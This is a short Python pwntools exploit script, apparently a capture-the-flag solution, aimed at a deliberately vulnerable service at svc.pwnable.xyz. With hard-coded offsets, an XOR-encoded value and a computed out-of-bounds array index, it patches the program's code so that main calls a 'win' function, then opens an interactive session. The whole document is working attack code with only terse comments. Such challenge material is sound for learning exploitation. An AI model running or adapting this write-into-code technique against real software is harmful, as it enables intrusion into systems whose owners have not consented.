###text section is intentionally set to rwx
###Hijack main function to call win

from pwn import *

###Addr
array_offset = 0x202200
exit_got_offset = 0x201fe8
win_offset = 0xa21
main_call_exit_offset = 0xac8

###Exploit
r = remote('svc.pwnable.xyz',30029)

#call win; [prefix of next instruction]
shellcode = b'\xe8\x54\xff\xff\xff\x48\x8b\x45'
shellcode = u64(shellcode)

r.sendlineafter(b'> \xf0\x9f\x92\xa9   ',str(shellcode^1)+' '+str(1)+' '+str((main_call_exit_offset-array_offset)//0x8))
r.sendlineafter(b'> \xf0\x9f\x92\xa9   ','M30W')

r.interactive()
